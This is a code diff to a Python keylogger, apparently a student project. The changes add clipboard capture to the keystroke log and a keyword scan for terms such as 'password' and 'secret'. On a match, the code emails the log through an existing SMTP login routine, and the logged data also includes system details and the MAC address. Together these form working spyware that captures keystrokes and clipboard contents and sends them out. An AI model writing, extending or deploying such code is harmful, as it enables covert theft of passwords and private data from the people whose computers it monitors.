@@ -19,8 +19,8 @@ import smtplib
 
 def cleanup_function():
     # Perform cleanup actions or trigger desired function
-    search()
-    # send_email()
+    if search():
+        send_email()
 
 def stamp(fp, prev, init=False, gap=10):
     now = datetime.now()
@@ -55,8 +55,8 @@ def keyPressed(key):
                 # print(str(key), char.encode('utf-8'))
                 if char == b'\x03':
                     logKey.write("<ctrl-c>")
-                    # clipboard_contents = get_clipboard_contents()
-                    # logKey.write(f"[Clipboard: {clipboard_contents}]")
+                    clipboard_contents = get_clipboard_contents()
+                    logKey.write(f"\n[Clipboard: {clipboard_contents}]")
                 elif char == b'\x16':
                     logKey.write("<ctrl-v>")
 
@@ -128,16 +128,40 @@ def send_email():
         smtp.login(email_sender, email_password)
         smtp.send_message(msg, email_sender, email_receiver)
         print("mail sent")
-    logKey.close()
+
 def search():
-    words = ['laptop', 'phone']
+    suspicious_keywords = [
+        'hack',
+        'exploit',
+        'malware',
+        'virus',
+        'phishing',
+        'password',
+        'secret',
+        'attack',
+        'intrusion',
+        'unauthorized',
+        'backdoor',
+        'suspicious',
+        'forbidden',
+        'dangerous',
+        'injection',
+        'vulnerable',
+        'compromise',
+        'tamper',
+        'hijack',
+        'breach'
+    ]
     with open(rf"C:\Users\USER\PycharmProjects\fyp\{filename}.txt", 'r') as logKey:
-        content = logKey.read()
+        content = logKey.read().lower()
+
     # Iterate list to find each word
-    for word in words:
+    for word in suspicious_keywords:
         if word in content:
             print('string exist in a file')
-        logKey.close()
+            return True
+
+    return False
 
 def system_and_mac():
     with open(f"{filename}.txt", 'a') as logKey:
@@ -149,7 +173,6 @@ def system_and_mac():
         # using regex expression
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         logKey.write("\nMAC Address : " + mac + "\n")
-        logKey.close()
 
 
 
@@ -160,7 +183,6 @@ if __name__ == "__main__":
     with open(f"{filename}.txt", 'a') as logKey:
         if os.stat(f"{filename}.txt").st_size == 0:
             system_and_mac()
-        logKey.close()
 
     last = None
     new = True
